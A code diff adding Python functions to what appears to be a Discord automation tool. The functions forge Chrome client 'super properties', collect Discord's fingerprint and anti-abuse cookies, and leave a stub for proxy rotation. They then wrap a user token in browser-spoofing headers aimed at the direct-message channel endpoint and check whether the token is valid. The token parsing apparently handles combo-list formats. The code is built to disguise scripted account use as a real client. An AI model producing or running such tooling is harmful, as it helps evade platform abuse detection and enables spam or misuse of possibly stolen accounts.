@@ -9,6 +9,73 @@ cyan = Fore.CYAN
 
 def cls(): #clears the terminal
     os.system('cls' if os.name=='nt' else 'clear')
+    
+def get_super_properties():
+    properties = '''{"os":"Windows","browser":"Chrome","device":"","system_locale":"en-GB","browser_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36","browser_version":"95.0.4638.54","os_version":"10","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":102113,"client_event_source":null}'''
+    properties = base64.b64encode(properties.encode()).decode()
+    return properties
+
+def get_fingerprint(s):
+    try:
+        fingerprint = s.get(f"https://discord.com/api/v9/experiments", timeout=5).json()["fingerprint"]
+        return fingerprint
+    except Exception as e:
+        return "Error"
+
+def get_cookies(s, url):
+    try:
+        cookieinfo = s.get(url, timeout=5).cookies
+        dcf = str(cookieinfo).split('__dcfduid=')[1].split(' ')[0]
+        sdc = str(cookieinfo).split('__sdcfduid=')[1].split(' ')[0]
+        return dcf, sdc
+    except:
+        return "", ""
+
+def get_proxy():
+    pass
+
+
+def get_headers(token):
+    while True:
+        s = httpx.Client(proxies=get_proxy())
+        dcf, sdc = get_cookies(s, "https://discord.com/")
+        fingerprint = get_fingerprint(s)
+        if fingerprint != "Error":
+            break
+    super_properties = get_super_properties()
+    headers = {
+        'authority': 'discord.com',
+        'method': 'POST',
+        'path': '/api/v9/users/@me/channels',
+        'scheme': 'https',
+        'accept': '*/*',
+        'accept-encoding': 'gzip, deflate',
+        'accept-language': 'en-US',
+        'authorization': token,
+        'cookie': f'__dcfduid={dcf}; __sdcfduid={sdc}',
+        'origin': 'https://discord.com',
+        'sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
+        'x-debug-options': 'bugReporterEnabled',
+        'x-fingerprint': fingerprint,
+        'x-super-properties': super_properties,
+    }
+    return s, headers
+
+def validate_token(s, headers):
+    check = s.get(f"https://discord.com/api/v9/users/@me", headers=headers)
+    if check.status_code == 200:
+        profile_name = check.json()["username"]
+        profile_discrim = check.json()["discriminator"]
+        profile_of_user = f"{profile_name}#{profile_discrim}"
+        return profile_of_user
+    else:
+        return False
 
 def find_token(token):
     if ':' in token:
